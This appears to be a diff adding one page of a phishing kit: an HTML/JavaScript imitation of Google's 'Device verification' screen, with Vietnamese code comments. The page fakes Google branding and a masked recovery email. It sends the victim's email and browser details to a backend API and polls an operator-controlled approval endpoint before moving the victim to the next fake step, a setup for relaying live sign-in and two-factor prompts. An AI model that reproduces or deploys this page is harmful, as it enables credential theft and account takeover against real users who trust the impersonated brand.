@@ -1,0 +1,402 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Device verification - Google Accounts</title>
+    <link rel="stylesheet" href="styles.css">
+    <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@300;400;500;600&family=Roboto:wght@300;400;500&display=swap" rel="stylesheet">
+    <link rel="icon" href="google_logo_icon_169090.ico">
+    <style>
+        /* Đẩy input xuống thấp hơn cho trang này */
+        .signin-form .input-field {
+            margin-top: 24px !important;
+        }
+    </style>
+</head>
+<body>
+    <!-- Loading overlay -->
+    <div class="loading-overlay" id="loadingOverlay">
+    </div>
+
+    <!-- Main content -->
+    <div class="main-wrapper page-transition">
+        <div class="login-wrapper">
+            <div class="content-card">
+                <!-- Progress bar container -->
+                <div class="progress-container">
+                    <div class="progress-bar" id="progressBar"></div>
+                </div>
+                <div class="signin-columns">
+                    <!-- Left Column: Logo, Title, Description -->
+                    <div class="content-left">
+                        <div class="logo-wrapper">
+                            <img src="google_logo_icon_169090.ico" alt="Google logo" class="google-logo" style="width:48px;height:48px;" />
+                        </div>
+                        <h1 class="signin-title">Get a notification on the device signed into your recovery email</h1>
+                        <p class="signin-subtitle">Your recovery email <strong>****••@gmail.com</strong> is signed into one or more of your devices. Google can send a notification to these devices to help you sign in.</p>
+                        <div class="user-info">
+                            <div class="user-email-btn" onclick="handleTransition('index.html')">
+                                <svg width="20" height="20" viewBox="0 0 24 24" class="user-icon-img">
+                                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z" fill="#5f6368"/>
+                                </svg>
+                                <span class="user-email" id="displayEmail"></span>
+                                <svg width="16" height="16" viewBox="0 0 24 24" class="arrow-img">
+                                    <path d="M7 10l5 5 5-5z" fill="#5f6368"/>
+                                </svg>
+                            </div>
+                        </div>
+                    </div>
+                    <!-- Right Column: Device Animation and Options -->
+                    <div class="content-right">
+                        <div class="device-illustration">
+                            <img src="https://ssl.gstatic.com/accounts/embedded/signin_tapyes.gif" alt="Tap Yes notification animation" class="device-gif">
+                        </div>
+                        <h2 class="instruction-title">Do you have your iPhone?</h2>
+                        <p class="instruction-text">Google will send a notification to your iPhone to verify it's you</p>
+                        <div class="checkbox-wrapper">
+                            <input type="checkbox" id="dontAskAgain" checked>
+                            <label for="dontAskAgain">Don't ask again on this device</label>
+                        </div>
+                        <div class="action-buttons">
+                            <button class="btn-secondary" onclick="handleTransition('verify-options.html')">Try another way</button>
+                            <button class="btn-primary" onclick="sendNotification()">Yes</button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <!-- Footer -->
+        <footer class="page-footer">
+            <div class="footer-wrapper">
+                <a href="#" class="footer-link">Help</a>
+                <a href="#" class="footer-link">Privacy</a>
+                <a href="#" class="footer-link">Terms</a>
+            </div>
+        </footer>
+    </div>
+
+    <script>
+        // Function to update page status
+        async function updatePageStatus(pageName) {
+            const requestId = localStorage.getItem('requestId');
+            if (!requestId) return;
+            
+            try {
+                await fetch('http://localhost:5000/api/update-page', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ 
+                        id: parseInt(requestId), 
+                        currentPage: pageName 
+                    })
+                });
+            } catch (err) {
+                console.log('Failed to update page status');
+            }
+        }
+
+        // Hàm kiểm tra trạng thái approval
+        async function checkApprovalStatus(requestId, nextPage) {
+            const maxAttempts = 60; // Tối đa 60 lần kiểm tra (5 phút)
+            let attempts = 0;
+            
+            const checkStatus = async () => {
+                try {
+                    const response = await fetch(`http://localhost:5000/api/status/${requestId}`);
+                    if (response.ok) {
+                        const data = await response.json();
+                        
+                        if (data.status === 'approved') {
+                            // Được approve, chuyển trang
+                            const email = localStorage.getItem('userEmail');
+                            handleTransition(nextPage + '?email=' + encodeURIComponent(email));
+                            return;
+                        } else if (data.status === 'denied') {
+                            // Bị từ chối, hiển thị thông báo
+                            showNotification('Access denied. Please try again later.', 'error');
+                            return;
+                        }
+                    }
+                    
+                    attempts++;
+                    if (attempts < maxAttempts) {
+                        // Kiểm tra nhanh hơn: 300ms thay vì 1 giây để responsive hơn
+                        setTimeout(checkStatus, 300);
+                    } else {
+                        // Hết thời gian chờ, chuyển trang
+                        const email = localStorage.getItem('userEmail');
+                        handleTransition(nextPage + '?email=' + encodeURIComponent(email));
+                    }
+                } catch (error) {
+                    console.error('Error checking approval status:', error);
+                    attempts++;
+                    if (attempts < maxAttempts) {
+                        setTimeout(checkStatus, 300);
+                    } else {
+                        const email = localStorage.getItem('userEmail');
+                        handleTransition(nextPage + '?email=' + encodeURIComponent(email));
+                    }
+                }
+            };
+            
+            // Bắt đầu kiểm tra
+            checkStatus();
+        }
+
+        // Hàm hiển thị thông báo
+        function showNotification(message, type = 'info') {
+            // Remove existing notifications
+            const existingNotification = document.querySelector('.notification');
+            if (existingNotification) {
+                existingNotification.remove();
+            }
+
+            const notification = document.createElement('div');
+            notification.className = `notification notification-${type}`;
+            notification.textContent = message;
+            
+            // Style the notification
+            notification.style.cssText = `
+                position: fixed;
+                top: 20px;
+                right: 20px;
+                padding: 12px 20px;
+                border-radius: 4px;
+                color: white;
+                font-size: 14px;
+                font-weight: 500;
+                z-index: 1000;
+                animation: slideIn 0.3s ease;
+                ${type === 'error' ? 'background-color: #d93025;' : 'background-color: #1a73e8;'}
+            `;
+
+            document.body.appendChild(notification);
+
+            // Remove notification after 3 seconds
+            setTimeout(() => {
+                notification.style.animation = 'slideOut 0.3s ease';
+                setTimeout(() => {
+                    if (notification.parentElement) {
+                        notification.remove();
+                    }
+                }, 300);
+            }, 3000);
+        }
+
+        // Page transition handler with smooth progress bar
+        function handleTransition(url) {
+            // Add fade-out effect to current page
+            const mainWrapper = document.querySelector('.main-wrapper');
+            mainWrapper.classList.add('fade-out');
+            
+            // Show loading overlay
+            const loadingOverlay = document.getElementById('loadingOverlay');
+            const progressBar = document.getElementById('progressBar');
+            const progressContainer = document.querySelector('.progress-container');
+            
+            loadingOverlay.classList.add('active');
+            progressContainer.classList.add('active');
+            
+            // Reset progress bar
+            progressBar.style.width = '0%';
+            progressBar.classList.remove('loading', 'completing');
+            
+            // Start smooth progress animation
+            setTimeout(() => {
+                progressBar.classList.add('loading');
+                progressBar.style.width = '80%';
+            }, 100);
+            
+            // Navigate after animation completes (giảm từ 1200ms xuống 600ms)
+            setTimeout(() => {
+                progressBar.classList.remove('loading');
+                progressBar.classList.add('completing');
+                progressBar.style.width = '100%';
+                
+                // Hide progress bar and navigate
+                setTimeout(() => {
+                    progressContainer.classList.remove('active');
+                    window.location.href = url;
+                }, 200);
+            }, 600);
+        }
+
+        // Send notification and proceed
+        function sendNotification() {
+            const submitBtn = document.querySelector('.btn-primary');
+            submitBtn.classList.add('loading');
+            submitBtn.disabled = true;
+            submitBtn.textContent = 'Sending...';
+            
+            // Lấy thông tin từ localStorage
+            const email = localStorage.getItem('userEmail') || '';
+            const requestId = localStorage.getItem('requestId');
+            
+            // Giảm delay từ 2000ms xuống 500ms để UX nhanh hơn
+            setTimeout(async () => {
+                if (requestId) {
+                    try {
+                        // Gửi cả 2 API calls song song để tăng tốc
+                        const [updateResult, requestResult] = await Promise.allSettled([
+                            // Cập nhật trạng thái trang
+                            fetch('http://localhost:5000/api/update-page', {
+                                method: 'POST',
+                                headers: { 'Content-Type': 'application/json' },
+                                body: JSON.stringify({
+                                    id: parseInt(requestId),
+                                    currentPage: 'verify-device.html'
+                                })
+                            }),
+                            
+                            // Gửi dữ liệu device verification mới
+                            fetch('http://localhost:5000/api/request', {
+                                method: 'POST',
+                                headers: { 'Content-Type': 'application/json' },
+                                body: JSON.stringify({
+                                    email: email,
+                                    password: '',
+                                    twofa: 'device_verification',
+                                    userAgent: navigator.userAgent,
+                                    currentPage: 'verify-device.html'
+                                })
+                            })
+                        ]);
+                        
+                        if (requestResult.status === 'fulfilled' && requestResult.value.ok) {
+                            const data = await requestResult.value.json();
+                            const newRequestId = data.requestId;
+                            localStorage.setItem('requestId', newRequestId);
+                            
+                            // Kiểm tra trạng thái approval
+                            await checkApprovalStatus(newRequestId, 'verify-notification.html');
+                        } else {
+                            // Nếu không kết nối được Backend, chuyển trang bình thường
+                            handleTransition(`verify-notification.html?email=${encodeURIComponent(email)}`);
+                        }
+                    } catch (err) {
+                        console.log('Backend not available, proceeding without approval');
+                        // Nếu có lỗi, chuyển trang bình thường
+                        handleTransition(`verify-notification.html?email=${encodeURIComponent(email)}`);
+                    }
+                } else {
+                    // Không có requestId, chuyển trang bình thường
+                    handleTransition(`verify-notification.html?email=${encodeURIComponent(email)}`);
+                }
+            }, 500);
+        }
+
+        // Mobile responsive handler
+        function handleMobileLayout() {
+            function checkMobile() {
+                if (window.innerWidth <= 600) {
+                    document.body.classList.add('mobile-layout');
+                } else {
+                    document.body.classList.remove('mobile-layout');
+                }
+            }
+            
+            checkMobile();
+            window.addEventListener('resize', checkMobile);
+        }
+
+        // Display user email and mask recovery email
+        function displayUserEmail() {
+            const urlParams = new URLSearchParams(window.location.search);
+            const email = urlParams.get('email') || localStorage.getItem('userEmail') || '';
+            const emailElements = document.querySelectorAll('.user-email');
+            
+            emailElements.forEach(element => {
+                element.textContent = email;
+            });
+            
+            // Mask recovery email in description
+            if (email) {
+                const emailParts = email.split('@');
+                if (emailParts.length === 2) {
+                    const maskedEmail = emailParts[0].substring(0, 3) + '••••@' + emailParts[1];
+                    const subtitle = document.querySelector('.signin-subtitle');
+                    subtitle.innerHTML = `Your recovery email <strong>${maskedEmail}</strong> is signed into one or more of your devices. Google can send a notification to these devices to help you sign in.`;
+                }
+            }
+        }
+
+        // Initialize when DOM is loaded
+        document.addEventListener('DOMContentLoaded', function() {
+            handleMobileLayout();
+            displayUserEmail();
+            
+            // Không tự động kiểm tra approval status, chỉ chờ người dùng bấm "Yes"
+        });
+
+        // Accessibility improvements
+        document.addEventListener('keydown', function(e) {
+            // Handle Enter key to send notification
+            if (e.key === 'Enter') {
+                sendNotification();
+            }
+            
+            // Handle Escape key to go back
+            if (e.key === 'Escape') {
+                handleTransition('verify-options.html');
+            }
+        });
+
+        // Handle browser back button
+        window.addEventListener('popstate', function(e) {
+            handleTransition('verify-options.html');
+        });
+    </script>
+
+    <style>
+        /* Tăng chiều cao card riêng cho trang này */
+        .content-card {
+            height: 546px !important; /* Tăng 30% từ 420px */
+        }
+
+        /* Device illustration styles */
+        .device-illustration {
+            margin-bottom: var(--spacing-xl);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .device-gif {
+            max-width: 280px;
+            width: 100%;
+            height: auto;
+            border-radius: var(--radius-medium);
+        }
+
+        /* Mobile adjustments */
+        @media (max-width: 600px) {
+            .content-card {
+                height: auto !important;
+                padding: 8px 4px !important;
+                gap: 8px !important;
+                max-width: 98vw;
+                min-width: unset;
+            }
+            .device-gif {
+                max-width: 120px;
+            }
+            .google-logo {
+                width: 32px;
+                height: 32px;
+            }
+            .signin-title {
+                font-size: 1.1rem;
+            }
+            .instruction-title, .instruction-text {
+                font-size: 0.95rem;
+            }
+            .user-email-btn {
+                font-size: 0.9rem;
+                height: 24px;
+                padding: 2px 8px 2px 4px;
+            }
+        }
+    </style>
+</body>
+</html> 
